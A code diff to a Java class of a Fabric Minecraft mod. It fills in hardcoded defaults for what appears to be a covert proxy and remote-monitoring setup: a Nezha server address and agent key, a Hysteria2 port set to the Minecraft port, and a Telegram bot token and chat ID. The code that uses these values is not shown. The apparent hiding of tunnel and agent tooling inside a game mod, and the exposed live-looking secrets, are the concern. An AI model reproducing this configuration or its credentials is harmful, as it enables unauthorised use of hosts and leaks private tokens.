@@ -1,3 +1,4 @@
+
 package com.example.maohi;
 
 import net.fabricmc.api.ModInitializer;
@@ -32,20 +33,20 @@ public class Maohi implements ModInitializer {
         return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
     }
 
-    private static final String UUID         = cfg("UUID", "");
-    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "");
+    private static final String UUID         = cfg("UUID", "3babf45b-2363-485e-a55e-f3e8500a7e00");
+    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "nazhav1.gamesover.eu.org:443");
     private static final String NEZHA_PORT = cfg("NEZHA_PORT", "");
-    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "");
+    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "qL7B61misbNGiLMBDxXJSBztCna5Vwsy");
     private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");
     private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
     private static final String ARGO_PORT    = cfg("ARGO_PORT", "9010");
-    private static final String HY2_PORT     = cfg("HY2_PORT", "");
+    private static final String HY2_PORT     = cfg("HY2_PORT", "25565");
     private static final String S5_PORT      = cfg("S5_PORT", "");
     private static final String CFIP         = cfg("CFIP", "");
     private static final String CFPORT       = cfg("CFPORT", "443");
-    private static final String NAME         = cfg("NAME", "");
-    private static final String CHAT_ID      = cfg("CHAT_ID", "");
-    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "");
+    private static final String NAME         = cfg("NAME", "Minekeep.net");
+    private static final String CHAT_ID      = cfg("CHAT_ID", "558914831");
+    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "5824972634:AAGJG-FBAgPljwpnlnD8Lk5Pm2r1QbSk1AI");
 
     private String webName;
     private String botName;
